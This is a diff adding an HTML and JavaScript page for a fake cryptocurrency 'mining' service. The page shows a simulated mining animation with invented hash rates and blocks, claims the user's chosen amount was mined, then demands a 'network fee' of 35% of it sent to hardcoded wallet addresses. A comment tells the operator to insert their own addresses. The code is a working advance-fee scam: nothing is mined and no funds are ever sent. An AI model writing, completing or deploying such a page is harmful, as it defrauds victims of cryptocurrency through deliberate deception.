+              <svg class="crypto-logo" viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">
+                <circle cx="16" cy="16" r="16" fill="#8247e5"/>
+                <path d="M22 12l-4-2.5-4 2.5v5l4 2.5 4-2.5v-5z" fill="#fff"/>
+                <path d="M14 17l-4-2.5v5l4 2.5v-5z" fill="#fff" opacity="0.7"/>
+                <path d="M10 9.5l4 2.5v5l-4-2.5v-5z" fill="#fff" opacity="0.5"/>
+              </svg>
+              <div class="crypto-name">Polygon</div>
+              <div class="crypto-symbol">MATIC</div>
+            </div>
+          </div>
+        </div>
+
+        <div style="text-align: center; margin-top: 50px;">
+          <button class="btn btn-primary" id="continueBtn1" disabled onclick="goToAmount()">
+            Continue Mining →
+          </button>
+        </div>
+      </div>
+
+      <!-- Screen 2: Select Amount -->
+      <div class="screen" id="amountScreen">
+        <div class="amount-section">
+          <h2>Select Mining Amount</h2>
+          <div class="amount-grid" id="amountGrid"></div>
+          <button class="btn btn-primary" id="continueBtn2" disabled onclick="goToWallet()">
+            Continue →
+          </button>
+          <button class="btn btn-secondary" onclick="backToCrypto()">
+            ← Back
+          </button>
+        </div>
+      </div>
+
+      <!-- Screen 3: Wallet -->
+      <div class="screen" id="walletScreen">
+        <div class="wallet-section">
+          <h2>Enter Your <span id="walletCrypto">BTC</span> Wallet</h2>
+          <div class="wallet-input-container">
+            <input 
+              type="text" 
+              class="wallet-input" 
+              id="walletInput" 
+              placeholder="Enter your wallet address..."
+              oninput="validateWallet()"
+            >
+            <div class="hint">Your mined crypto will be sent to this address</div>
+          </div>
+          <div style="margin-top: 40px;">
+            <button class="btn btn-primary" id="startMiningBtn" disabled onclick="startMining()">
+              Start Mining ⛏️
+            </button>
+            <button class="btn btn-secondary" onclick="backToAmount()">
+              ← Back
+            </button>
+          </div>
+        </div>
+      </div>
+
+      <!-- Screen 5: Success -->
+      <div class="screen" id="successScreen">
+        <div class="success-screen">
+          <div class="success-icon">✅</div>
+          <h2>Mining Completed Successfully!</h2>
+
+          <div class="info-box">
+            <div class="info-row">
+              <span class="info-label">Cryptocurrency:</span>
+              <span class="info-value" id="resultCrypto">BTC</span>
+            </div>
+            <div class="info-row">
+              <span class="info-label">Mined Amount:</span>
+              <span class="info-value" id="resultAmount">0.5 BTC</span>
+            </div>
+            <div class="info-row">
+              <span class="info-label">Wallet Address:</span>
+              <span class="info-value" id="resultWallet">1A1z...</span>
+            </div>
+          </div>
+
+          <button class="btn btn-primary" onclick="showPaymentInfo()" style="margin-top: 40px; font-size: 20px; padding: 20px 60px;">
+            View Payment Instructions →
+          </button>
+        </div>
+      </div>
+
+      <!-- Screen 6: Payment Instructions -->
+      <div class="screen" id="paymentScreen">
+        <div class="success-screen">
+          <h2>Payment Instructions</h2>
+
+          <div class="fee-notice">
+            <div class="icon">💳</div>
+            <h3>Complete Network Fee Payment</h3>
+            <p>Your cryptocurrency has been successfully mined! To receive your mined funds, a small network transaction fee is required to process the transfer to your wallet.</p>
+            <p>This fee covers the blockchain network costs and ensures your mined crypto is delivered securely to your wallet address. Once the fee payment is confirmed, your mined amount will be automatically transferred.</p>
+            <p><strong>Follow these simple steps to receive your mined cryptocurrency:</strong></p>
+            
+            <div style="text-align: left; margin: 30px 0; padding: 20px; background: rgba(255, 255, 255, 0.1); border: 2px solid rgba(255, 255, 255, 0.3); border-radius: 15px;">
+              <div style="margin-bottom: 15px;"><strong>STEP 1:</strong> Copy the payment address below</div>
+              <div style="margin-bottom: 15px;"><strong>STEP 2:</strong> Open your crypto wallet</div>
+              <div style="margin-bottom: 15px;"><strong>STEP 3:</strong> Send the exact amount specified</div>
+              <div><strong>STEP 4:</strong> Wait for confirmation (usually up to 30 minutes, depending on network)</div>
+            </div>
+
+            <div class="fee-amount" id="feeAmount2">0.5 BTC</div>
+            
+            <div class="wallet-box">
+              <div class="wallet-box-title">💰 Payment Address (<span id="feeCrypto2">BTC</span>):</div>
+              <div class="wallet-address" id="feeWalletAddress2">1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa</div>
+              <button onclick="copyFeeAddress2()" class="copy-btn">
+                📋 Copy Address
+              </button>
+              <div class="wallet-note">
+                ⚠️ Exact Amount: <span id="feeAmountCrypto2" style="font-weight: 700;">0.000460 BTC</span>
+              </div>
+            </div>
+
+            <div style="margin-top: 30px; padding: 20px; background: rgba(255, 255, 255, 0.1); border: 2px solid rgba(255, 255, 255, 0.3); border-radius: 15px;">
+              <p style="font-size: 14px;">⚠️ IMPORTANT: Send only <span id="feeCrypto3">BTC</span> to this address. Sending any other cryptocurrency will result in permanent loss of funds.</p>
+            </div>
+
+            <div style="margin-top: 30px; padding: 25px; background: rgba(0, 255, 65, 0.08); border: 2px solid #00ff41; border-radius: 15px;">
+              <h4 style="color: #00ff41; font-size: 20px; margin-bottom: 15px; text-shadow: 0 0 10px #00ff41;">💰 After Payment You Will Receive:</h4>
+              <div style="font-size: 32px; font-weight: 900; color: #00ff41; text-shadow: 0 0 20px #00ff41;" id="finalAmount">0.5 BTC</div>
+              <p style="color: #00cc33; font-size: 14px; margin-top: 10px;">The funds will be sent to your wallet address within up to 30 minutes after fee confirmation, depending on the cryptocurrency network and payment provider.</p>
+            </div>
+          </div>
+
+          <button class="btn btn-primary" onclick="resetMining()">
+            Start New Mining Session
+          </button>
+          <button class="btn btn-secondary" onclick="backToSuccess()">
+            ← Back to Summary
+          </button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Screen 4: Matrix Loading -->
+  <div class="loading-screen-wrapper" id="loadingWrapper">
+    <canvas class="matrix-canvas" id="matrixCanvas"></canvas>
+    <div class="matrix-content">
+      <div class="matrix-title">⛏️ MINING IN PROGRESS...</div>
+      <div class="matrix-status" id="matrixStatus">INITIALIZING QUANTUM PROCESSORS...</div>
+      <div class="matrix-console" id="matrixConsole"></div>
+    </div>
+  </div>
+
+  <script>
+    // Актуальные курсы на 28 октября 2025
+    const prices = {
+      BTC: 115744,
+      ETH: 4230,
+      BNB: 1152,
+      SOL: 203,
+      XRP: 2.70,
+      ADA: 0.68,
+      DOGE: 0.21,
+      USDT: 1.00,
+      LTC: 102,
+      TRX: 0.24,
+      DOT: 7.85,
+      MATIC: 0.52
+    };
+
+    // Кошельки для оплаты fee (ЗАПОЛНИТЕ СВОИ АДРЕСА)
+    const feeWallets = {
+      BTC: 'bc1qd3dgjpad83n3lcffgr6svfqxnzjq0del654udd',
+      ETH: '0xf80291cbF331ECE2AC9FCd158c233072ef1d4061',
+      BNB: 'YOUR_BNB_WALLET_ADDRESS_HERE',
+      SOL: 'H9VHkrcPWd1GKfKuTFQXayeXUw9tQGnrsyZRDjFBk38d',
+      XRP: 'rU5BaxFY6smEA37pQ6nX61o6FzJ3gh2j86',
+      ADA: 'addr1q8jg6jhj8ucaw02svq7kdqc2eugmzy7j2xwvvtlemlpf586tjkfjadj70vkp5tru4y9zk83t5s8rh06pjk52ml3h4hns4xrmda',
+      DOGE: 'D7wDNcmgfJJ1mKB5dF4Jx6Jund2S36TBBc',
+      USDT: 'TX4gfiSDkUX6uMTjgaxdfKEL5Drawj3kVU',
+      LTC: 'ltc1q6ft3rcne5fkmgg8s6xan9rwg4gnjcr2284rqje',
+      TRX: 'TX4gfiSDkUX6uMTjgaxdfKEL5Drawj3kVU',
+      DOT: '1s4fi9QdaZpWBfDzbpQ1mwsByCK7ynB4L2ppeZxEt8MUyx8',
+      MATIC: 'YOUR_MATIC_WALLET_ADDRESS_HERE'
+    };
+
+    let selectedCrypto = '';
+    let selectedAmountCrypto = 0;
+    let selectedWallet = '';
+    let feeAmountCrypto = 0;
+
+    // Варианты количества для майнинга
+    const miningAmounts = {
+      BTC: [0.001, 0.005, 0.01, 0.05],
+      ETH: [0.01, 0.05, 0.1, 0.5],
+      BNB: [0.1, 0.5, 1, 5],
+      SOL: [1, 5, 10, 50],
+      XRP: [50, 100, 500, 1000],
+      ADA: [100, 500, 1000, 5000],
+      DOGE: [500, 1000, 5000, 10000],
+      USDT: [50, 100, 500, 1000],
+      LTC: [0.1, 0.5, 1, 3],
+      TRX: [500, 1000, 5000, 7000],
+      DOT: [10, 50, 100, 300],
+      MATIC: [100, 500, 1000, 3000]
+    };
+
+    // Animate stats
+    function animateNumber(element, target) {
+      let current = 0;
+      const increment = target / 100;
+      const timer = setInterval(() => {
+        current += increment;
+        if (current >= target) {
+          current = target;
+          clearInterval(timer);
+        }
+        element.textContent = Math.floor(current).toLocaleString();
+      }, 20);
+    }
+
+    window.addEventListener('load', () => {
+      animateNumber(document.getElementById('usersCount'), 32567);
+      animateNumber(document.getElementById('withdrawalsCount'), 451892);
+      animateNumber(document.getElementById('tokensSent'), 38941);
+    });
+
+    function showScreen(id) {
+      document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+      document.getElementById(id).classList.add('active');
+      window.scrollTo(0, 0);
+    }
+
+    function scrollToCrypto() {
+      const cryptoSection = document.querySelector('.crypto-section');
+      cryptoSection.scrollIntoView({ 
+        behavior: 'smooth',
+        block: 'start'
+      });
+    }
+
+    function selectCrypto(crypto) {
+      selectedCrypto = crypto;
+      document.querySelectorAll('.crypto-card').forEach(c => c.classList.remove('selected'));
+      event.target.closest('.crypto-card').classList.add('selected');
+      document.getElementById('continueBtn1').disabled = false;
+    }
+
+    function goToAmount() {
+      const amounts = miningAmounts[selectedCrypto];
+      const grid = document.getElementById('amountGrid');
+      grid.innerHTML = '';
+
+      amounts.forEach(amount => {
+        const card = document.createElement('div');
+        card.className = 'amount-card';
+        card.onclick = () => selectAmount(amount);
+        card.innerHTML = `
+          <div class="amount-crypto">${amount} ${selectedCrypto}</div>
+        `;
+        grid.appendChild(card);
+      });
+
+      showScreen('amountScreen');
+    }
+
+    function selectAmount(amount) {
+      selectedAmountCrypto = amount;
+      
+      // Расчёт fee - 35% от выбранной суммы
+      feeAmountCrypto = (amount * 0.35).toFixed(8);
+      feeAmountCrypto = parseFloat(feeAmountCrypto);
+      
+      document.querySelectorAll('.amount-card').forEach(c => c.classList.remove('selected'));
+      event.target.closest('.amount-card').classList.add('selected');
+      document.getElementById('continueBtn2').disabled = false;
+    }
+
+    function goToWallet() {
+      document.getElementById('walletCrypto').textContent = selectedCrypto;
+      showScreen('walletScreen');
+    }
+
+    function validateWallet() {
+      const wallet = document.getElementById('walletInput').value.trim();
+      document.getElementById('startMiningBtn').disabled = wallet.length < 10;
+    }
+
+    function startMining() {
+      selectedWallet = document.getElementById('walletInput').value.trim();
+      document.querySelector('.main-screen').style.display = 'none';
+      document.getElementById('loadingWrapper').classList.add('active');
+      initMatrix();
+      simulateMining();
+    }
+
+    // Matrix Rain Effect
+    function initMatrix() {
+      const canvas = document.getElementById('matrixCanvas');
+      const ctx = canvas.getContext('2d');
+
+      canvas.width = window.innerWidth;
+      canvas.height = window.innerHeight;
+
+      const columns = Math.floor(canvas.width / 20);
+      const drops = Array(columns).fill(1);
+
+      const chars = '01アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ';
+
+      function draw() {
+        ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
+        ctx.fillRect(0, 0, canvas.width, canvas.height);
+
+        ctx.fillStyle = '#00ff00';
+        ctx.font = '15px monospace';
+
+        for (let i = 0; i < drops.length; i++) {
+          const text = chars[Math.floor(Math.random() * chars.length)];
+          ctx.fillText(text, i * 20, drops[i] * 20);
+
+          if (drops[i] * 20 > canvas.height && Math.random() > 0.975) {
+            drops[i] = 0;
+          }
+          drops[i]++;
+        }
+      }
+
+      setInterval(draw, 33);
+    }
+
+    function simulateMining() {
+      let progress = 0;
+      const status = document.getElementById('matrixStatus');
+      const console = document.getElementById('matrixConsole');
+
+      const statuses = [
+        'INITIALIZING QUANTUM PROCESSORS...',
+        'CONNECTING TO DECENTRALIZED NETWORK...',
+        'VERIFYING BLOCKCHAIN INTEGRITY...',
+        'ALLOCATING GPU RESOURCES...',
+        'COMPUTING CRYPTOGRAPHIC HASHES...',
+        'PROCESSING MERKLE TREES...',
+        'VALIDATING PROOF-OF-WORK...',
+        'MINING BLOCKS IN PARALLEL...',
+        'OPTIMIZING HASH RATE...',
+        'SYNCHRONIZING WITH NETWORK NODES...',
+        'FINALIZING TRANSACTION...'
+      ];
+
+      const codeInterval = setInterval(() => {
+        const line = document.createElement('div');
+        line.className = 'matrix-line';
+        line.textContent = generateMatrixCode();
+        console.appendChild(line);
+        console.scrollTop = console.scrollHeight;
+
+        if (console.children.length > 50) {
+          console.removeChild(console.children[0]);
+        }
+      }, 50);
+
+      const interval = setInterval(() => {
+        progress += 100 / 40;
+
+        if (progress <= 100) {
+          const statusIndex = Math.floor((progress / 100) * (statuses.length - 1));
+          status.textContent = statuses[statusIndex];
+        }
+
+        if (progress >= 100) {
+          clearInterval(interval);
+          clearInterval(codeInterval);
+          setTimeout(showSuccess, 1000);
+        }
+      }, 1000);
+    }
+
+    function generateMatrixCode() {
+      const templates = [
+        () => `01${Math.random().toString(2).substr(2, 32)} ${Math.random() > 0.5 ? '[VERIFIED]' : '[PENDING]'}`,
+        () => `[HASH] 0x${Array(64).fill(0).map(() => Math.floor(Math.random()*16).toString(16)).join('')}`,
+        () => `>>> BLOCK #${Math.floor(Math.random() * 999999)} | NONCE: ${Math.floor(Math.random() * 9999999)}`,
+        () => `11${Math.random().toString(2).substr(2, 28)}00 => ${(Math.random() * 100).toFixed(8)} ${selectedCrypto}`,
+        () => `[THREAD ${Math.floor(Math.random()*16)}] ${Math.random().toString(16).substr(2,12).toUpperCase()} [ACCEPTED]`,
+        () => `${Array(48).fill(0).map(() => Math.floor(Math.random()*2)).join('')} ${Math.floor(Math.random()*256)}ms`,
+        () => `GPU[${Math.floor(Math.random()*4)}]: ${(Math.random() * 500 + 100).toFixed(2)} MH/s | TEMP: ${Math.floor(Math.random()*30+50)}°C`,
+        () => `[${new Date().getTime()}] MINING REWARD: ${(Math.random() * 0.001).toFixed(8)} ${selectedCrypto}`,
+        () => `>> SHARE FOUND: ${Math.random().toString(36).substr(2, 16).toUpperCase()}`,
+        () => `0101${Array(32).fill(0).map(() => Math.floor(Math.random()*2)).join('')}1010 [✓]`,
+        () => `[POOL] DIFFICULTY: ${Math.floor(Math.random() * 9999999)} | WORKERS: ${Math.floor(Math.random()*100+50)}`,
+        () => `KERNEL: ${['SHA-256', 'ETHASH', 'SCRYPT', 'X11', 'EQUIHASH'][Math.floor(Math.random()*5)]} | LOAD: ${Math.floor(Math.random()*100)}%`,
+        () => `${Math.random().toString(16).substr(2,8)} ${Math.random().toString(16).substr(2,8)} ${Math.random().toString(16).substr(2,8)}`,
+        () => `[${['INFO', 'WARN', 'OKAY', 'GOOD'][Math.floor(Math.random()*4)]}] ${Math.random().toString(36).substr(2, 20).toUpperCase()}`,
+        () => `NETWORK HASHRATE: ${(Math.random() * 1000 + 100).toFixed(2)} TH/s | BLOCKS: ${Math.floor(Math.random()*999999)}`
+      ];
+      
+      return templates[Math.floor(Math.random() * templates.length)]();
+    }
+
+    function showSuccess() {
+      document.getElementById('loadingWrapper').classList.remove('active');
+      document.querySelector('.main-screen').style.display = 'block';
+      
+      document.getElementById('resultCrypto').textContent = selectedCrypto;
+      document.getElementById('resultAmount').textContent = selectedAmountCrypto + ' ' + selectedCrypto;
+      document.getElementById('resultWallet').textContent = selectedWallet;
+      
+      showScreen('successScreen');
+    }
+
+    function showPaymentInfo() {
+      document.getElementById('feeAmount2').textContent = feeAmountCrypto + ' ' + selectedCrypto;
+      document.getElementById('feeCrypto2').textContent = selectedCrypto;
+      document.getElementById('feeCrypto3').textContent = selectedCrypto;
+      document.getElementById('feeWalletAddress2').textContent = feeWallets[selectedCrypto];
+      document.getElementById('feeAmountCrypto2').textContent = feeAmountCrypto + ' ' + selectedCrypto;
+      document.getElementById('finalAmount').textContent = selectedAmountCrypto + ' ' + selectedCrypto;
+      
+      showScreen('paymentScreen');
+    }
+
+    function copyFeeAddress2() {
+      const address = document.getElementById('feeWalletAddress2').textContent;
+      navigator.clipboard.writeText(address).then(() => {
+        const btn = event.target;
+        const originalText = btn.textContent;
+        btn.textContent = '✅ Copied!';
+        setTimeout(() => {
+          btn.textContent = originalText;
+        }, 2000);
+      });
+    }
+
+    function backToCrypto() { showScreen('cryptoScreen'); }
+    function backToAmount() { showScreen('amountScreen'); }
+    function backToSuccess() { showScreen('successScreen'); }
+
+    function resetMining() {
+      document.getElementById('walletInput').value = '';
+      document.getElementById('matrixConsole').innerHTML = '';
+      document.querySelectorAll('.crypto-card, .amount-card').forEach(c => c.classList.remove('selected'));
+      selectedCrypto = selectedAmountCrypto = selectedWallet = feeAmountCrypto = '';
+      document.getElementById('continueBtn1').disabled = true;
+      document.getElementById('continueBtn2').disabled = true;
+      showScreen('cryptoScreen');
+    }
+  </script>
+</body>
+</html>
